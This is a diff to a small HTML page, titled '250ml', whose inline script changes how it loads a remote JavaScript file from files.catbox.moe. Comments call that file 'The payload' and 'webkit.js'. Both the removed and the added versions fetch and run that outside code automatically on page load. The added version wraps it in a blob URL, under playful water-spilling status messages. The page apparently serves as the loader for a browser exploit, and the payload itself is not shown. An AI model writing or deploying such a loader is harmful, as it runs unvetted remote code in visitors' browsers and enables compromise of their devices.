@@ -5,26 +5,33 @@
   <title>250ml</title>
   <link rel="stylesheet" href="style250.css" />
   <script>
-  const preLoad = new Array(5e7).fill(123); // Allocates ~50MB up front
-
   setTimeout(() => {
-    preLoad.length = 0; // Releases that memory
+    fetch('https://files.catbox.moe/cwedrd.js') // Your untouched webkit.js
+      .then(res => res.text())
+      .then(js => {
+        const blob = new Blob([js], { type: 'application/javascript' });
+        const url = URL.createObjectURL(blob);
 
-    const script = document.createElement('script');
-    script.src = 'https://files.catbox.moe/cwedrd.js'; // The payload
-    script.defer = true;
+        const script = document.createElement('script');
+        script.src = url;
+        script.defer = true;
 
-    script.onload = () => {
-      document.getElementById("status").textContent = "Spilling water unless system frozen...";
-    };
+        script.onload = () => {
+          document.getElementById("status").textContent = "Spilling 250ml... (unless frozen)";
+        };
 
-    script.onerror = () => {
-      document.getElementById("status").textContent = "Bottle not filled.";
-    };
+        script.onerror = () => {
+          document.getElementById("status").textContent = "Water not spilled.";
+        };
 
-    document.head.appendChild(script);
-  }, 2000); // Gives GC a moment to stabilize
+        document.head.appendChild(script);
+      })
+      .catch(err => {
+        document.getElementById("status").textContent = "Bottle not filled: " + err.message;
+      });
+  }, 1500);
 </script>
+
 </head>
 <body>
   <div class="container">
